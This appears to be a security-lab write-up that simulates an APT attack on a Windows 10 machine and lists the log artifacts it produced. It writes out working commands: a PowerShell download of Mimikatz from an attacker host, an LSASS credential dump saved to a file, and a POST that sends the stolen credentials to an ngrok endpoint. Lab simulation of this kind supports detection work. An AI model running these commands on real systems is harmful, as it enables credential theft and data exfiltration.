# Scenario 5: Credential Dumping & HTTPS Exfiltration (APT Simulation)

## Simulated Activity:
Simulate real-world attacker behavior involving credential dumping from LSASS using Mimikatz, followed by data exfiltration over a secure HTTPS channel — a common stealth tactic in advanced persistent threat (APT) operations.

---

## Tools Used:
- **Windows 10** (Target machine)
- **Python3 HTTP Server** (initial attempt)
- **ngrok** (for HTTPS tunneling)
- **Mimikatz** (Credential extraction)
- **Wireshark** (Network packet capture)
- **Sysmon + PowerShell Logging** (Log detection)

---

## 🔬 Simulation Steps:

## 1. Credential Dumping with Mimikatz:
### **File transferred** to target Windows machine using Python HTTP server:
```powershell
Invoke-WebRequest -Uri "http://<Kali-IP>:8000/mimikatz.exe" -OutFile "C:\temp\mimikatz.exe"
```

### Executed with Admin privileges:
```powershell
cd C:\temp

.\mimikatz.exe

log C:\temp\creds.txt

privilege::debug
sekurlsa::logonpasswords

exit
```
- Output saved in C:\temp\creds.txt using Mimikatz’s built-in logging.

## 2. Simulating Encrypted Exfiltration:
### Ngrok tunnel established on Kali to simulate HTTPS attacker server:
```bash
ngrok http 443
```
### Exfiltration Command from Windows:
```powershell
Invoke-WebRequest -Uri "https://<ngrok-address>" -Method POST -InFile "C:\temp\creds.txt"
```
- Response: 404 Not Found (✅ expected, since no backend receiver)
- ngrok console confirmed incoming HTTPS POST request from Windows.

## Logs & Forensics Observed:
|Source|Artifact|
|------|--------|
|Sysmon|Event ID 1(Process Creation) and event ID 3 (Network Connection)|
|Powershell|Command logs for file download and POST request|
|ngrok|POST request captured with timestamp|

